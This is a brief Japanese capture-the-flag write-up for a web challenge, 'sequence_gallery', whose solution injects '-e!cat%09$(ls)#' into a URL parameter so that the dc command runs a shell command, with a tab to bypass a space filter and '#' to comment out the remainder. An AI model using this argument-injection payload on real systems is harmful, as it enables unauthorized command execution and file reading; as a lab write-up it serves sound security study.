---
type: writeup
tags: web
---

# sequence_gallery

## 要約

* ローカル環境整えるの大事
* ディレクトリトラバーサル、じゃなさそう
  * <https://blog.hamayanhamayan.com/entry/2021/12/08/220449>
* subprocessの脆弱性、じゃなさそう
  * `shell=True`じゃないので（知らんけど）
* dcコマンドっぽい
  * <https://kazmax.zpp.jp/cmd/d/dc.1.html>
  * `-e` が使えそう（）
* 空白が使えないならタブを使えばいいでしょ
  * <https://www.w3bai.com/ja/tags/ref_urlencode.html#gsc.tab=0>

## 考察

## 解法

以下にアクセスしてフラグを得る。

```text
http://sequence-gallery.chal.crewc.tf:8080/?sequence=-e!cat%09$(ls)#
```

```text
dc -e!cat%09$(ls)#
```

* `!`: シェルコマンド実行
* `%09`: `\t`に変換される
* `#`: 以降はコメント
